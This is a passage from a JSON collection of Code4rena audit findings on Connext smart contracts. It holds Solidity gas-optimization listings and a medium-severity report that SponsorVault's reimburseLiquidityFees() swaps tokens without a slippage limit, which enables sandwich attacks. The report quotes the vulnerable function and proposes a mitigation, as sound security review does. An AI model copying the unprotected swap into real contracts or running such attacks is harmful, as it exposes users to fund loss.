{\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:254:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:268:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:289:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:300:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:302:      for (uint256 j = 0; j < numTokens; j++) {\ncore/connext/libraries/SwapUtils.sol:344:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:405:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:425:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:81:    for (uint256 i = 0; i < length; ) {\n```\n\nConsider removing explicit initializations for default values.\n\n## 13. A variable should be immutable\n\nThis variable is only set in the constructor and never edited after that:\n\n```solidity\ncore/connext/helpers/ConnextPriceOracle.sol:49:  address public wrapped;\n```\n\nConsider marking it as immutable, as it would avoid the expensive storage-writing operation (around 20 000 gas)\n\n## 14. Use Custom Errors instead of Revert Strings to save Gas\n\nSolidity 0.8.4 introduced custom errors. They are more gas efficient than revert strings, when it comes to deploy cost as well as runtime cost when the revert condition is met. Use custom errors instead of revert strings for gas savings.\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nConsider replacing all revert strings with custom errors in the solution.\n\n```solidity\ncore/connext/facets/BaseConnextFacet.sol:38:    require(s._status != _ENTERED, \"ReentrancyGuard: reentrant call\");\ncore/connext/facets/BaseConnextFacet.sol:125:    require(_remote != bytes32(0), \"!remote\");\ncore/connext/helpers/BridgeToken.sol:94:    require(\ncore/connext/helpers/BridgeToken.sol:130:    require(block.timestamp <= _deadline, \"ERC20Permit: expired deadline\");\ncore/connext/helpers/BridgeToken.sol:131:    require(_owner != address(0), \"ERC20Permit: owner zero address\");\ncore/connext/helpers/BridgeToken.sol:136:    require(_signer == _owner, \"ERC20Permit: invalid signature\");\ncore/connext/helpers/ConnextPriceOracle.sol:72:    require(msg.sender == admin, \"caller is not the admin\");\ncore/connext/helpers/ConnextPriceOracle.sol:150:    require(baseTokenPrice > 0, \"invalid base token\");\ncore/connext/helpers/Executor.sol:57:    require(msg.sender == connext, \"#OC:027\");\ncore/connext/helpers/LPToken.sol:35:    require(amount != 0, \"LPToken: cannot mint 0\");\ncore/connext/helpers/LPToken.sol:50:    require(to != address(this), \"LPToken: cannot send to itself\");\ncore/connext/helpers/Multicall.sol:18:      require(success);\ncore/connext/helpers/OZERC20.sol:185:    require(_sender != address(0), \"ERC20: transfer from the zero address\");\ncore/connext/helpers/OZERC20.sol:186:    require(_recipient != address(0), \"ERC20: transfer to the zero address\");\ncore/connext/helpers/OZERC20.sol:205:    require(_account != address(0), \"ERC20: mint to the zero address\");\ncore/connext/helpers/OZERC20.sol:226:    require(_account != address(0), \"ERC20: burn from the zero address\");\ncore/connext/helpers/OZERC20.sol:253:    require(_owner != address(0), \"ERC20: approve from the zero address\");\ncore/connext/helpers/OZERC20.sol:254:    require(_spender != address(0), \"ERC20: approve to the zero address\");\ncore/connext/helpers/StableSwap.sol:75:    require(_pooledTokens.length > 1, \"_pooledTokens.length <= 1\");\ncore/connext/helpers/StableSwap.sol:76:    require(_pooledTokens.length <= 32, \"_pooledTokens.length > 32\");\ncore/connext/helpers/StableSwap.sol:77:    require(_pooledTokens.length == decimals.length, \"_pooledTokens decimals mismatch\");\ncore/connext/helpers/StableSwap.sol:84:        require(\ncore/connext/helpers/StableSwap.sol:89:      require(address(_pooledTokens[i]) != address(0), \"The 0 address isn't an ERC-20\");\ncore/connext/helpers/StableSwap.sol:90:      require(decimals[i] <= SwapUtils.POOL_PRECISION_DECIMALS, \"Token decimals exceeds max\");\ncore/connext/helpers/StableSwap.sol:96:    require(_a < AmplificationUtils.MAX_A, \"_a exceeds maximum\");\ncore/connext/helpers/StableSwap.sol:97:    require(_fee < SwapUtils.MAX_SWAP_FEE, \"_fee exceeds maximum\");\ncore/connext/helpers/StableSwap.sol:98:    require(_adminFee < SwapUtils.MAX_ADMIN_FEE, \"_adminFee exceeds maximum\");\ncore/connext/helpers/StableSwap.sol:102:    require(lpToken.initialize(lpTokenName, lpTokenSymbol), \"could not init lpToken clone\");\ncore/connext/helpers/StableSwap.sol:125:    require(block.timestamp <= deadline, \"Deadline not met\");\ncore/connext/helpers/StableSwap.sol:155:    require(index < swapStorage.pooledTokens.length, \"Out of range\");\ncore/connext/helpers/StableSwap.sol:167:    require(address(getToken(index)) == tokenAddress, \"Token does not exist\");\ncore/connext/helpers/StableSwap.sol:177:    require(index < swapStorage.pooledTokens.length, \"Index out of range\");\ncore/connext/helpers/TokenRegistry.sol:163:    require(_tokenId.domain != 0, \"!repr\");\ncore/connext/helpers/TokenRegistry.sol:228:    require(_token != address(0), \"!token\");\ncore/connext/libraries/AmplificationUtils.sol:84:    require(block.timestamp >= self.initialATime.add(1 days), \"Wait 1 day before starting ramp\");\ncore/connext/libraries/AmplificationUtils.sol:85:    require(futureTime_ >= block.timestamp.add(MIN_RAMP_TIME), \"Insufficient ramp time\");\ncore/connext/libraries/AmplificationUtils.sol:86:    require(futureA_ > 0 && futureA_ < MAX_A, \"futureA_ must be > 0 and < MAX_A\");\ncore/connext/libraries/AmplificationUtils.sol:92:      require(futureAPrecise.mul(MAX_A_CHANGE) >= initialAPrecise, \"futureA_ is too small\");\ncore/connext/libraries/AmplificationUtils.sol:94:      require(futureAPrecise <= initialAPrecise.mul(MAX_A_CHANGE), \"futureA_ is too large\");\ncore/connext/libraries/AmplificationUtils.sol:111:    require(self.futureATime > block.timestamp, \"Ramp is already stopped\");\ncore/connext/libraries/ConnextMessage.sol:116:    require(isValidAction(_action), \"!action\");\ncore/connext/libraries/LibDiamond.sol:66:    require(msg.sender == diamondStorage().contractOwner, \"LibDiamond: Must be contract owner\");\ncore/connext/libraries/LibDiamond.sol:100:    require(\ncore/connext/libraries/LibDiamond.sol:121:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:123:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:132:      require(oldFacetAddress == address(0), \"LibDiamondCut: Can't add function that already exists\");\ncore/connext/libraries/LibDiamond.sol:139:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:141:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:150:      require(oldFacetAddress != _facetAddress, \"LibDiamondCut: Can't replace function with same function\");\ncore/connext/libraries/LibDiamond.sol:158:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:161:    require(_facetAddress == address(0), \"LibDiamondCut: Remove facet address must be address(0)\");\ncore/connext/libraries/LibDiamond.sol:191:    require(_facetAddress != address(0), \"LibDiamondCut: Can't remove function that doesn't exist\");\ncore/connext/libraries/LibDiamond.sol:193:    require(_facetAddress != address(this), \"LibDiamondCut: Can't remove immutable function\");\ncore/connext/libraries/LibDiamond.sol:224:      require(_calldata.length == 0, \"LibDiamondCut: _init is address(0) but_calldata is not empty\");\ncore/connext/libraries/LibDiamond.sol:226:      require(_calldata.length > 0, \"LibDiamondCut: _calldata is empty but _init is not address(0)\");\ncore/connext/libraries/LibDiamond.sol:247:    require(contractSize > 0, _errorMessage);\ncore/connext/libraries/SwapUtils.sol:191:    require(tokenIndex < xp.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:198:    require(tokenAmount <= xp[tokenIndex], \"Withdraw exceeds available\");\ncore/connext/libraries/SwapUtils.sol:248:    require(tokenIndex < numTokens, \"Token not found\");\ncore/connext/libraries/SwapUtils.sol:342:    require(numTokens == precisionMultipliers.length, \"Balances must match multipliers\");\ncore/connext/libraries/SwapUtils.sol:396:    require(tokenIndexFrom != tokenIndexTo, \"Can't compare token to itself\");\ncore/connext/libraries/SwapUtils.sol:397:    require(tokenIndexFrom < numTokens && tokenIndexTo < numTokens, \"Tokens must be in pool\");\ncore/connext/libraries/SwapUtils.sol:493:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:524:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:554:    require(amount <= totalSupply, \"Cannot exceed total supply\");\ncore/connext/libraries/SwapUtils.sol:615:    require(index < self.pooledTokens.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:649:      require(dx <= tokenFrom.balanceOf(msg.sender), \"Cannot swap more than you own\");\ncore/connext/libraries/SwapUtils.sol:662:    require(dy >= minDy, \"Swap didn't result in min tokens\");\ncore/connext/libraries/SwapUtils.sol:697:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\ncore/connext/libraries/SwapUtils.sol:703:    require(dx <= maxDx, \"Swap needs more than max tokens\");\ncore/connext/libraries/SwapUtils.sol:717:      require(dx <= tokenFrom.balanceOf(msg.sender), \"Cannot swap more than you own\");\ncore/connext/libraries/SwapUtils.sol:723:      require(dx == tokenFrom.balanceOf(address(this)).sub(beforeBalance), \"not support fee token\");\ncore/connext/libraries/SwapUtils.sol:750:    require(dx <= tokenFrom.balanceOf(msg.sender), \"Cannot swap more than you own\");\ncore/connext/libraries/SwapUtils.sol:756:    require(dy >= minDy, \"Swap didn't result in min tokens\");\ncore/connext/libraries/SwapUtils.sol:784:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\ncore/connext/libraries/SwapUtils.sol:790:    require(dx <= maxDx, \"Swap didn't result in min tokens\");\ncore/connext/libraries/SwapUtils.sol:823:    require(amounts.length == pooledTokens.length, \"Amounts must match pooled tokens\");\ncore/connext/libraries/SwapUtils.sol:845:      require(v.totalSupply != 0 || amounts[i] > 0, \"Must supply all tokens in pool\");\ncore/connext/libraries/SwapUtils.sol:861:    require(v.d1 > v.d0, \"D should increase\");\ncore/connext/libraries/SwapUtils.sol:890:    require(toMint >= minToMint, \"Couldn't mint min requested\");\ncore/connext/libraries/SwapUtils.sol:916:    require(amount <= lpToken.balanceOf(msg.sender), \">LP.balanceOf\");\ncore/connext/libraries/SwapUtils.sol:917:    require(minAmounts.length == pooledTokens.length, \"minAmounts must match poolTokens\");\ncore/connext/libraries/SwapUtils.sol:925:      require(amounts[i] >= minAmounts[i], \"amounts[i] < minAmounts[i]\");\ncore/connext/libraries/SwapUtils.sol:954:    require(tokenAmount <= lpToken.balanceOf(msg.sender), \">LP.balanceOf\");\ncore/connext/libraries/SwapUtils.sol:955:    require(tokenIndex < pooledTokens.length, \"Token not found\");\ncore/connext/libraries/SwapUtils.sol:961:    require(dy >= minAmount, \"dy < minAmount\");\ncore/connext/libraries/SwapUtils.sol:1005:    require(amounts.length == pooledTokens.length, \"Amounts should match pool tokens\");\ncore/connext/libraries/SwapUtils.sol:1007:    require(maxBurnAmount <= v.lpToken.balanceOf(msg.sender) && maxBurnAmount != 0, \">LP.balanceOf\");\ncore/connext/libraries/SwapUtils.sol:1032:    require(tokenAmount != 0, \"Burnt amount cannot be zero\");\ncore/connext/libraries/SwapUtils.sol:1035:    require(tokenAmount <= maxBurnAmount, \"tokenAmount > maxBurnAmount\");\ncore/connext/libraries/SwapUtils.sol:1071:    require(newAdminFee <= MAX_ADMIN_FEE, \"Fee is too high\");\ncore/connext/libraries/SwapUtils.sol:1084:    require(newSwapFee <= MAX_SWAP_FEE, \"Fee is too high\");\ncore/shared/Router.sol:23:    require(_isRemoteRouter(_origin, _router), \"!remote router\");\ncore/shared/Router.sol:64:    require(_remote != bytes32(0), \"!remote\");\ncore/shared/XAppConnectionClient.sol:22:    require(_isReplica(msg.sender), \"!replica\");\n```\n\n## 15. Functions guaranteed to revert when called by normal users can be marked `payable`\n\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n```solidity\ncore/connext/facets/AssetFacet.sol:100:  function setWrapper(address _wrapper) external onlyOwner {\ncore/connext/facets/AssetFacet.sol:112:  function setTokenRegistry(address _tokenRegistry) external onlyOwner {\ncore/connext/facets/AssetFacet.sol:162:  function addStableSwapPool(ConnextMessage.TokenId calldata _canonical, address _stableSwapPool) external onlyOwner {\ncore/connext/facets/AssetFacet.sol:171:  function removeAssetId(bytes32 _canonicalId, address _adoptedAssetId) external onlyOwner {\ncore/connext/facets/BridgeFacet.sol:233:  function setPromiseRouter(address payable _promiseRouter) external onlyOwner {\ncore/connext/facets/BridgeFacet.sol:242:  function setExecutor(address _executor) external onlyOwner {\ncore/connext/facets/BridgeFacet.sol:250:  function setSponsorVault(address _sponsorVault) external onlyOwner {\ncore/connext/facets/NomadFacet.sol:25:  function setXAppConnectionManager(address _xAppConnectionManager) external onlyOwner {\ncore/connext/facets/NomadFacet.sol:34:  function enrollRemoteRouter(uint32 _domain, bytes32 _router) external onlyOwner {\ncore/connext/facets/PortalFacet.sol:57:  function setAavePool(address _aavePool) external onlyOwner {\ncore/connext/facets/PortalFacet.sol:65:  function setAavePortalFee(uint256 _aavePortalFeeNumerator) external onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:128:  function proposeRouterOwnershipRenunciation() public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:142:  function renounceRouterOwnership() public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:162:  function proposeAssetOwnershipRenunciation() public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:175:  function renounceAssetOwnership() public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:203:  function proposeNewOwner(address newlyProposed) public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:217:  function renounceOwnership() public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:236:  function acceptProposedOwner() public onlyProposed {\ncore/connext/facets/ProposedOwnableFacet.sol:253:  function pause() public onlyOwner {\ncore/connext/facets/ProposedOwnableFacet.sol:258:  function unpause() public onlyOwner {\ncore/connext/facets/RelayerFacet.sol:88:  function setRelayerFeeRouter(address _relayerFeeRouter) external onlyOwner {\ncore/connext/facets/RelayerFacet.sol:101:  function addRelayer(address _relayer) external onlyOwner {\ncore/connext/facets/RelayerFacet.sol:112:  function removeRelayer(address _relayer) external onlyOwner {\ncore/connext/facets/RelayerFacet.sol:161:  function claim(address _recipient, bytes32[] calldata _transferIds) external onlyRelayerFeeRouter {\ncore/connext/facets/RoutersFacet.sol:293:  function removeRouter(address router) external onlyOwner {\ncore/connext/facets/RoutersFacet.sol:331:  function setMaxRoutersPerTransfer(uint256 _newMaxRouters) external onlyOwner {\ncore/connext/facets/RoutersFacet.sol:345:  function setLiquidityFeeNumerator(uint256 _numerator) external onlyOwner {\ncore/connext/facets/RoutersFacet.sol:361:  function approveRouterForPortal(address _router) external onlyOwner {\ncore/connext/facets/RoutersFacet.sol:375:  function unapproveRouterForPortal(address _router) external onlyOwner {\ncore/connext/facets/RoutersFacet.sol:393:  function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) {\ncore/connext/facets/RoutersFacet.sol:410:  function proposeRouterOwner(address router, address proposed) external onlyRouterOwner(router) {\ncore/connext/facets/RoutersFacet.sol:430:  function acceptProposedRouterOwner(address router) external onlyProposedRouterOwner(router) {\ncore/connext/facets/StableSwapFacet.sol:460:  function withdrawSwapAdminFees(bytes32 canonicalId) external onlyOwner {\ncore/connext/facets/StableSwapFacet.sol:469:  function setSwapAdminFee(bytes32 canonicalId, uint256 newAdminFee) external onlyOwner {\ncore/connext/facets/StableSwapFacet.sol:478:  function setSwapFee(bytes32 canonicalId, uint256 newSwapFee) external onlyOwner {\ncore/connext/facets/StableSwapFacet.sol:502:  function stopRampA(bytes32 canonicalId) external onlyOwner {\ncore/connext/helpers/BridgeToken.sol:54:  function burn(address _from, uint256 _amnt) external override onlyOwner {\ncore/connext/helpers/BridgeToken.sol:66:  function mint(address _to, uint256 _amnt) external override onlyOwner {\ncore/connext/helpers/BridgeToken.sol:73:  function setDetailsHash(bytes32 _detailsHash) external override onlyOwner {\ncore/connext/helpers/BridgeToken.sol:202:  function transferOwnership(address _newOwner) public override(IBridgeToken, OwnableUpgradeable) onlyOwner {\ncore/connext/helpers/ConnextPriceOracle.sol:158:  function setDirectPrice(address _token, uint256 _price) external onlyAdmin {\ncore/connext/helpers/ConnextPriceOracle.sol:163:  function setV1PriceOracle(address _v1PriceOracle) external onlyAdmin {\ncore/connext/helpers/ConnextPriceOracle.sol:168:  function setAdmin(address newAdmin) external onlyAdmin {\ncore/connext/helpers/ConnextPriceOracle.sol:175:  function setAggregators(address[] calldata tokenAddresses, address[] calldata sources) external onlyAdmin {\ncore/connext/helpers/LPToken.sol:34:  function mint(address recipient, uint256 amount) external onlyOwner {\ncore/connext/helpers/OwnerPausableUpgradeable.sol:14:  function __OwnerPausable_init() internal onlyInitializing {\ncore/connext/helpers/OwnerPausableUpgradeable.sol:23:  function pause() external onlyOwner {\ncore/connext/helpers/OwnerPausableUpgradeable.sol:30:  function unpause() external onlyOwner {\ncore/connext/helpers/OZERC20.sol:263:   * WARNING: This function should only be called from the constructor. Most\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:77:  function __ProposedOwnable_init() internal onlyInitializing {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:81:  function __ProposedOwnable_init_unchained() internal onlyInitializing {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:155:  function proposeRouterOwnershipRenunciation() public virtual onlyOwner {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:169:  function renounceRouterOwnership() public virtual onlyOwner {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:197:  function proposeAssetOwnershipRenunciation() public virtual onlyOwner {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:211:  function renounceAssetOwnership() public virtual onlyOwner {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:239:  function proposeNewOwner(address newlyProposed) public virtual onlyOwner {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:253:  function renounceOwnership() public virtual onlyOwner {\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:272:  function acceptProposedOwner() public virtual onlyProposed {\ncore/connext/helpers/SponsorVault.sol:138:  function setConnext(address _connext) external onlyOwner {\ncore/connext/helpers/SponsorVault.sol:147:  function setRate(uint32 _originDomain, Rate calldata _rate) external onlyOwner {\ncore/connext/helpers/SponsorVault.sol:159:  function setRelayerFeeCap(uint256 _relayerFeeCap) external onlyOwner {\ncore/connext/helpers/SponsorVault.sol:168:  function setGasTokenOracle(address _gasTokenOracle) external onlyOwner {\ncore/connext/helpers/SponsorVault.sol:178:  function setTokenExchange(address _token, address payable _tokenExchange) external onlyOwner {\ncore/connext/helpers/StableSwap.sol:440:  function withdrawAdminFees() external onlyOwner {\ncore/connext/helpers/StableSwap.sol:448:  function setAdminFee(uint256 newAdminFee) external onlyOwner {\ncore/connext/helpers/StableSwap.sol:456:  function setSwapFee(uint256 newSwapFee) external onlyOwner {\ncore/connext/helpers/StableSwap.sol:467:  function rampA(uint256 futureA, uint256 futureTime) external onlyOwner {\ncore/connext/helpers/StableSwap.sol:474:  function stopRampA() external onlyOwner {\ncore/promise/PromiseRouter.sol:155:  function setConnext(address _connext) external onlyOwner {\ncore/relayer-fee/RelayerFeeRouter.sol:89:  function setConnext(address _connext) external onlyOwner {\ncore/shared/ProposedOwnable.sol:109:  function proposeNewOwner(address newlyProposed) public virtual onlyOwner {\ncore/shared/ProposedOwnable.sol:123:  function renounceOwnership() public virtual onlyOwner {\ncore/shared/ProposedOwnable.sol:142:  function acceptProposedOwner() public virtual onlyProposed {\ncore/shared/ProposedOwnable.sol:180:  function __ProposedOwnable_init() internal onlyInitializing {\ncore/shared/ProposedOwnable.sol:184:  function __ProposedOwnable_init_unchained() internal onlyInitializing {\ncore/shared/Router.sol:34:  function enrollRemoteRouter(uint32 _domain, bytes32 _router) external onlyOwner {\ncore/shared/XAppConnectionClient.sol:39:  function setXAppConnectionManager(address _xAppConnectionManager) external onlyOwner {\n```\n\n## 16. Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:104:  uint256 internal constant FEE_DENOMINATOR = 10**10;\ncore/connext/libraries/SwapUtils.sol:107:  uint256 internal constant MAX_SWAP_FEE = 10**8;\ncore/connext/libraries/SwapUtils.sol:113:  uint256 internal constant MAX_ADMIN_FEE = 10**10;\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-06-connext-findings",
      "repo": "https://github.com/code-423n4/2022-06-connext-findings",
      "url": "https://github.com/code-423n4/2022-06-connext-findings/issues/261"
    }
  },
  {
    "title": "in reimburseLiquidityFees() of SponserVault contract swaps tokens without slippage limit so its possible to perform sandwich attack and it create MEV",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/helpers/SponsorVault.sol#L187-L220\n\n\n# Vulnerability details\n\n## Impact\nwhen code swaps tokens it should specify slippage but in `reimburseLiquidityFees()` code contract calls ` tokenExchange.swapExactIn()` without slippage and it's possible to perform sandwich attack and make contract to swap on bad exchange rates and there is MEV.\n\n## Proof of Concept\nThis is `reimburseLiquidityFees()` code in `SponserVault `:\n```\n  /**\n   * @notice Performs liquidity fee reimbursement.\n   * @dev Uses the token exchange or liquidity deposited in this contract.\n   *      The `_receiver` address is only used for emitting in the event.\n   * @param _token The address of the token\n   * @param _liquidityFee The liquidity fee amount\n   * @param _receiver The address of the receiver\n   * @return Sponsored liquidity fee amount\n   */\n  function reimburseLiquidityFees(\n    address _token,\n    uint256 _liquidityFee,\n    address _receiver\n  ) external override onlyConnext returns (uint256) {\n    uint256 sponsoredFee;\n\n    if (address(tokenExchanges[_token]) != address(0)) {\n      uint256 currentBalance = address(this).balance;\n      ITokenExchange tokenExchange = tokenExchanges[_token];\n\n      uint256 amountIn = tokenExchange.getInGivenExpectedOut(_token, _liquidityFee);\n      amountIn = currentBalance >= amountIn ? amountIn : currentBalance;\n\n      // sponsored fee may end being less than _liquidityFee due to slippage\n      sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender);\n    } else {\n      uint256 balance = IERC20(_token).balanceOf(address(this));\n      sponsoredFee = balance < _liquidityFee ? balance : _liquidityFee;\n\n      // some ERC20 do not allow to transfer 0 amount\n      if (sponsoredFee > 0) {\n        IERC20(_token).safeTransfer(msg.sender, sponsoredFee);\n      }\n    }\n\n    emit ReimburseLiquidityFees(_token, sponsoredFee, _receiver);\n\n    return sponsoredFee;\n  }\n```\nAs you can see there is no slippage defined when calling `swapExactIn()` can that swap could happen in any exchange rate. it's possible to perform sandwich attack and do large swap before and after the transaction and make users lose funds. and it's also MEV opportunity.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nspecify slippage when calling swap tokens.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-06-connext-findings",
      "repo": "https://github.com/code-423n4/2022-06-connext-findings",
      "url": "https://github.com/code-423n4/2022-06-connext-findings/issues/237"
    }
  }
]